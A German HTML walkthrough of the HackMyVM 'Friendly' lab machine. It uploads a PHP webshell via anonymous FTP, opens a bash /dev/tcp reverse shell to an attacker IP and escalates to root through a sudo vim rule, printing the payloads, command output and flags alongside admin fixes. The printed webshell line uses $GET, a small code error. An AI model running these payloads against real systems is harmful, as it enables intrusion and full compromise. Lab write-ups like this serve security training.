@@ -1,0 +1,457 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Friendly - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Friendly - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">vi / Editor</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">Web Browser / curl</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">which</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">vim</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">id</div>
+                <!-- arp-scan nicht im Text, daher weggelassen -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration-ftp">Enumeration & File Upload (FTP)</a></li>
+                <li><a href="#initial-access">Initial Access (RCE via Web Shell)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (www-data -> root via Sudo Vim)</a></li>
+                <li><a href="#poc">Proof of Concept (Sudo Vim Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf die Ziel-IP `192.168.2.117` durchgeführt. Optionen: `-sS` (SYN Scan), `-sC` (Default Scripts), `-sV` (Version Detection), `-T5` (Insane Timing), `-AO` (OS Detection), `-p-` (Alle Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                *   **Port 21/tcp:** FTP (ProFTPD). **Kritisch:** Anonymer Login ist erlaubt (`ftp-anon: Anonymous FTP login allowed`). Im Root-Verzeichnis des FTP-Servers liegt eine `index.html`-Datei.
+                *   **Port 80/tcp:** HTTP (Apache httpd 2.4.54 Debian). Eine aktuelle Apache-Version mit der Standardseite.
+                Die OS-Erkennung deutet auf Linux hin, und die MAC-Adresse bestätigt eine VirtualBox-VM. Der Hostname `freund.hmv` wird ebenfalls ermittelt.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Der anonyme FTP-Zugang ist der vielversprechendste Angriffsvektor. Untersuchen Sie die FTP-Berechtigungen (insbesondere Upload). Prüfen Sie, ob das FTP-Root-Verzeichnis dem Web-Root-Verzeichnis (`/var/www/html`) entspricht oder darauf abgebildet ist.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Deaktivieren Sie den anonymen FTP-Zugang oder schränken Sie ihn stark ein (kein Schreibzugriff, chroot-Umgebung). Stellen Sie sicher, dass FTP-Verzeichnisse nicht über HTTP zugänglich sind.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.117 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 23:32 CEST
+Nmap scan report for freund.hmv (192.168.2.117)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:A2:9F:C0 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms freund.hmv (192.168.2.117)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.76 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="enumeration-ftp">
+             <h2>Enumeration & File Upload (FTP)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine einfache PHP-Webshell (`<?php system($GET['cmd']); ?>`) wird lokal vorbereitet (`echo`, `vi`, `mv`). Die `/etc/hosts`-Datei wird angepasst, um `freund.hmv` auf die IP `192.168.2.117` zu mappen. Mittels `lftp` wird eine anonyme Verbindung zum FTP-Server aufgebaut. Es wird versucht, Verzeichnisse zu wechseln (`cd ..`, `cd /home`), was fehlschlägt. Anschließend werden die vorbereitete `test.txt` und die Webshell `test.php` erfolgreich in das FTP-Root-Verzeichnis hochgeladen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der anonyme FTP-Login funktioniert und erlaubt **Datei-Uploads** in das Wurzelverzeichnis des FTP-Servers. Da im Wurzelverzeichnis bereits eine `index.html` liegt (die vermutlich auch über HTTP auf Port 80 erreichbar ist), ist es sehr wahrscheinlich, dass das FTP-Root-Verzeichnis dem Web-Root (`/var/www/html`) entspricht. Das Hochladen einer PHP-Datei in dieses Verzeichnis ermöglicht Remote Code Execution (RCE), wenn die Datei über HTTP aufgerufen wird.
+            </p> 
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Rufen Sie die hochgeladene PHP-Datei (`test.php`) über den Webbrowser oder `curl` auf (`http://freund.hmv/test.php`). Hängen Sie den `cmd`-Parameter an, um Befehle auszuführen (z.B. `?cmd=id`). Nutzen Sie dies, um eine Reverse Shell zu erhalten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Kritische Fehlkonfiguration!** Deaktivieren Sie den anonymen FTP-Upload sofort. Stellen Sie sicher, dass das FTP-Verzeichnis nicht das Web-Root-Verzeichnis ist oder anderweitig über HTTP erreichbar ist. Konfigurieren Sie ProFTPD und Apache sicher.
+            </p>
+            <!-- PHP Webshell Vorbereitung -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">echo "test" > test.txt</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">vi test.txt</span></div>
+                     <!-- Inhalt geändert zu: <?php system($GET['cmd']); ?> -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">mv test.txt test.php</span></div>
+                 </div>
+             </div>
+             <!-- /etc/hosts Anpassung -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">cat /etc/hosts</span></div>
+                      <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+#192.168.2.107   whythisapiissofast.kitty.hmv kitty.hmv fake.local jwt.hmv
+192.168.2.117    freund.hmv # Eintrag hinzugefügt/korrigiert
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+                      </pre>
+                  </div>
+              </div>
+              <!-- lftp Interaktion -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">lftp -u 'anonymous', 192.168.2.117</span></div>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:~> <span class="command">ls</span></div>
+                      <pre>-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html</pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">cd ..</span></div>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">ls</span></div>
+                      <pre>-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html</pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">pwd</span></div>
+                      <pre>ftp://anonymous:@192.168.2.117/</pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">cd /home</span></div>
+                      <pre>cd: Zugriff nicht möglich:550 /home: No such file or directory</pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">put test.txt</span></div>
+                      <pre>5 Bytes übertragen</pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">ls</span></div>
+                      <pre>
+-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
+-rw-r--r--   1 ftp      nogroup         5 Apr  4 21:42 test.txt
+                      </pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">put test.php</span></div>
+                      <pre>31 Bytes übertragen</pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">ls</span></div>
+                      <pre>
+-rw-r--r--   1 root     root        10725 Feb 23 15:26 index.html
+-rw-r--r--   1 ftp      nogroup        31 Apr  4 21:43 test.php
+-rw-r--r--   1 ftp      nogroup         5 Apr  4 21:42 test.txt
+                      </pre>
+                      <div class="prompt lftp-prompt">lftp anonymous@192.168.2.117:/> <span class="command">quit</span></div>
+                  </div>
+              </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (RCE via Web Shell)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die hochgeladene Webshell `test.php` wird über HTTP aufgerufen. Zuerst wird der Befehl `id` ausgeführt, dann `cat /etc/passwd` und `cat /etc/passwd | grep bash`, um Informationen über den Benutzer (`www-data`) und andere Benutzer auf dem System (`RiJaba1`) zu sammeln.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die RCE funktioniert wie erwartet. Die Befehle werden als Benutzer `www-data` ausgeführt. Die Analyse von `/etc/passwd` enthüllt einen regulären Benutzer namens `RiJaba1`.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutzen Sie die RCE, um eine Reverse Shell zum Angreifer-System aufzubauen. Dies ermöglicht eine interaktive Sitzung als `www-data`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Entfernen Sie die hochgeladene Datei `test.php`. Beheben Sie die anonyme FTP-Upload-Schwachstelle.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Aufruf im Browser oder mit curl: http://freund.hmv/test.php?cmd=id
+# Ergebnis:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# Aufruf im Browser oder mit curl: http://freund.hmv/test.php?cmd=cat%20/etc/passwd
+# Ergebnis:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534:/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+proftpd:x:105:65534:/run/proftpd:/usr/sbin/nologin
+ftp:x:106:65534:/srv/ftp:/usr/sbin/nologin
+RiJaba1:x:1000:1000:/home/RiJaba1:/bin/bash
+                      </pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <pre>
+# Aufruf im Browser oder mit curl: http://freund.hmv/test.php?cmd=cat%20/etc/passwd%20%7C%20grep%20bash
+# Ergebnis:
+root:x:0:0:root:/root:/bin/bash
+RiJaba1:x:1000:1000:/home/RiJaba1:/bin/bash
+                       </pre>
+                   </div>
+               </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine Reverse Shell wird mittels `nc` und einer Bash-Payload aufgebaut.
+                1.  Ein Listener wird auf dem Angreifer-System gestartet: `nc -lvnp 9001`.
+                2.  Die Webshell wird mit einer URL-kodierten Bash-Reverse-Shell-Payload aufgerufen: `http://freund.hmv/test.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.114%2F9001%200%3E%261%27`.
+                3.  Der Listener empfängt die Verbindung und eine Shell als `www-data` wird erhalten.
+                4.  Die Shell wird mit `python3`, `export TERM` und `stty raw -echo; fg` stabilisiert.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Aufbau der Reverse Shell und die Stabilisierung sind erfolgreich. Der Pentester hat nun eine stabile, interaktive Shell als `www-data`. Initialer Zugriff erreicht.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Führen Sie lokale Enumeration als `www-data` durch. Suchen Sie nach der User-Flag (wahrscheinlich im Home-Verzeichnis von `RiJaba1`) und nach Wegen zur Rechteausweitung (z.B. `sudo -l`, SUID-Binaries).
+             </p>
+             <!-- Listener starten -->
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                      <pre>listening on [any] 9001 ...</pre>
+                  </div>
+              </div>
+              <!-- Reverse Shell Auslösen -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Aufruf im Browser oder mit curl:
+http://freund.hmv/test.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.114%2F9001%200%3E%261%27
+                      </pre>
+                      <!-- Keine Ausgabe erwartet -->
+                  </div>
+              </div>
+              <!-- Verbindung und Stabilisierung -->
+              <div class="code-block">
+                   <div class="terminal">
+                       <!-- Listener empfängt Verbindung -->
+                       <pre>connect to [192.168.2.114] from (UNKNOWN) [192.168.2.117] 56220</pre>
+                       <!-- Shell wird erhalten -->
+                       <pre>bash: cannot set terminal process group (444): Inappropriate ioctl for device
+bash: no job control in this shell</pre>
+                       <div class="prompt no-kali-prompt">www-data@friendly:/var/www/html$ </div>
+                       <!-- Stabilisierung -->
+                       <div class="prompt no-kali-prompt">www-data@friendly:/var/www/html$ <span class="command">which python3</span></div>
+                       <pre>/usr/bin/python3</pre>
+                       <div class="prompt no-kali-prompt">www-data@friendly:/var/www/html$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                       <div class="prompt no-kali-prompt">www-data@friendly:/var/www/html$ <span class="command">export TERM=xterm</span></div>
+                       <!-- Auf Angreifer-System: Ctrl+Z, dann stty -->
+                       <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# ^Z
+zsh: suspended  nc -lvnp 9001</div>
+                       <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                       <pre>
+[1]  + continued  nc -lvnp 9001
+                       </pre>
+                       <!-- Zurück in der stabilisierten Reverse Shell -->
+                       <div class="prompt no-kali-prompt">www-data@friendly:/var/www/html$ <span class="command">reset</span></div>
+                       <div class="prompt no-kali-prompt">www-data@friendly:/var/www/html$ </div>
+                   </div>
+               </div>
+        </section>
+
+        <section id="privesc-root">
+             <h2>Privilege Escalation (www-data -> root via Sudo Vim)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Als `www-data` wird das Home-Verzeichnis des Benutzers `RiJaba1` untersucht und die User-Flag gelesen. Anschließend werden die `sudo`-Rechte für `www-data` überprüft.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   Die User-Flag `<span class="password">b8cff8c9008e1c98a1f2937b4475acd6</span>` wird erfolgreich aus `/home/RiJaba1/user.txt` gelesen. `www-data` hat Leserechte auf diese Datei.
+                 *   `sudo -l` enthüllt die **kritische Schwachstelle:** `User www-data may run the following commands on friendly: (ALL : ALL) NOPASSWD: /usr/bin/vim`. Der Webserver-Benutzer darf `vim` als jeder Benutzer (insbesondere `root`) ohne Passwort ausführen.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo vim`-Berechtigung zur sofortigen Root-Eskalation. Führen Sie `sudo vim` aus und geben Sie im Editor `:!/bin/sh` ein, um eine Root-Shell zu erhalten.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Entfernen Sie sofort die `sudo`-Regel für `vim`. Der Webserver-Benutzer (`www-data`) sollte niemals `sudo`-Rechte haben, schon gar nicht für einen Editor und ohne Passwort. Überprüfen Sie alle `sudo`-Regeln auf dem System.
+             </p>
+              <!-- User Flag -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt no-kali-prompt">www-data@friendly:/var/www$ <span class="command">cd /home/</span></div>
+                      <div class="prompt no-kali-prompt">www-data@friendly:/home$ <span class="command">ls</span></div>
+                      <pre>RiJaba1</pre>
+                      <div class="prompt no-kali-prompt">www-data@friendly:/home$ <span class="command">cd RiJaba1/</span></div>
+                      <div class="prompt no-kali-prompt">www-data@friendly:/home/RiJaba1$ <span class="command">ls</span></div>
+                      <pre>CTF  Private  YouTube  user.txt</pre>
+                      <div class="prompt no-kali-prompt">www-data@friendly:/home/RiJaba1$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">b8cff8c9008e1c98a1f2937b4475acd6</span></pre>
+                  </div>
+              </div>
+              <!-- Sudo -l -->
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt no-kali-prompt">www-data@friendly:/home/RiJaba1$ <span class="command">sudo -l</span></div>
+                       <pre>
+Matching Defaults entries for www-data on friendly:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on friendly:
+    (ALL : ALL) NOPASSWD: /usr/bin/vim
+                       </pre>
+                   </div>
+               </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+             <h2>Proof of Concept (Sudo Vim Exploit)</h2>
+             <p class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Ausnutzung einer unsicheren `sudo`-Regel, die dem Benutzer `www-data` erlaubt, `/usr/bin/vim` als `root` ohne Passwort auszuführen. Da `vim` die Ausführung externer Befehle ermöglicht, kann dies direkt zur Erlangung einer Root-Shell missbraucht werden.
+             </p>
+             <p class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 *   Zugriff als Benutzer `www-data`.
+                 *   Die `sudo`-Regel `(ALL : ALL) NOPASSWD: /usr/bin/vim` muss aktiv sein.
+             </p>
+
+             <p class="analysis">
+                 <strong>Schritte zur Ausnutzung:</strong>
+                 1.  **Vim als Root starten:** Der Befehl `sudo -u root vim` wird ausgeführt. Da `NOPASSWD` gesetzt ist, erfolgt keine Passwortabfrage. `vim` startet mit Root-Rechten.
+                 2.  **Shell-Befehl aus Vim ausführen:** Innerhalb von `vim` wird der Befehl `:!/bin/sh` eingegeben und mit Enter bestätigt. Das `:!` führt einen externen Shell-Befehl aus.
+                 3.  **Root-Shell erhalten:** `/bin/sh` wird gestartet. Da `vim` als `root` lief, erbt die gestartete Shell die Root-Privilegien.
+                 4.  **Bestätigung:** Der Befehl `id` wird in der neuen Shell ausgeführt und bestätigt `uid=0(root)`.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Exploit ist trivial und erfolgreich. Die unsichere `sudo`-Regel ermöglicht die sofortige Eskalation zu Root. Fantastisch, Root-Zugriff erlangt!
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Root-Zugriff erreicht. Suchen Sie nach der Root-Flag.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Entfernen Sie die unsichere `sudo`-Regel für `vim` sofort. Überprüfen Sie alle `sudo`-Konfigurationen gründlich.
+             </p>
+              <p class="evaluation">
+                  <strong>Risikobewertung:</strong> Die Kombination aus einer unsicheren FTP-Konfiguration (anonymer Upload ins Web-Root) und einer extrem gefährlichen `sudo`-Regel ermöglichte eine einfache Kompromittierung und Eskalation zum Root-Benutzer. Das Risiko ist **kritisch**.
+              </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt no-kali-prompt">www-data@friendly:/home/RiJaba1$ <span class="command">sudo -u root vim -c ':!/bin/sh'</span></div>
+                      <!-- Vim startet, führt den Befehl aus und startet die Shell -->
+                      <div class="prompt root-prompt"># <span class="command">id</span></div>
+                      <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                      <!-- Root-Shell erhalten! -->
+                  </div>
+              </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Nach Erhalt der Root-Shell wird versucht, die Root-Flag zu lesen. Zuerst in `/root/root.txt`, dann wird mit `find` nach allen Dateien namens `root.txt` gesucht.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Die Datei `/root/root.txt` enthält eine "Fake"-Flag. Der `find`-Befehl findet die echte Flag in `/var/log/apache2/root.txt`. Das Lesen dieser Datei mit `cat` enthüllt die Root-Flag: `<span class="password">66b5c58f3e83aff307441714d3e28d2f</span>`.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Root-Flag gefunden. Test abgeschlossen.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Platzieren Sie sensible Dateien wie Flags nicht an ungewöhnlichen Orten wie Log-Verzeichnissen. Schützen Sie die Root-Flag mit korrekten Berechtigungen (nur für Root lesbar) und am Standardort `/root/root.txt`.
+              </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt root-prompt"># <span class="command">cat /root/root.txt</span></div>
+                      <pre>Not yet! Find root.txt.</pre>
+                      <div class="prompt root-prompt"># <span class="command">find / -name root.txt 2>/dev/null</span></div>
+                      <pre>
+/var/log/apache2/root.txt
+/root/root.txt
+                      </pre>
+                       <div class="prompt root-prompt"># <span class="command">cat /var/log/apache2/root.txt</span></div>
+                       <pre><span class="password">66b5c58f3e83aff307441714d3e28d2f</span></pre>
+                   </div>
+               </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User-Flag wurde im Home-Verzeichnis von `RiJaba1` gefunden. Die Root-Flag wurde im Apache-Log-Verzeichnis gefunden, nachdem Root-Rechte erlangt wurden.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/RiJaba1/user.txt</div>
+                     <div class="flag-value"><span class="password">b8cff8c9008e1c98a1f2937b4475acd6</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /var/log/apache2/root.txt</div>
+                     <div class="flag-value"><span class="password">66b5c58f3e83aff307441714d3e28d2f</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-04</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html> 
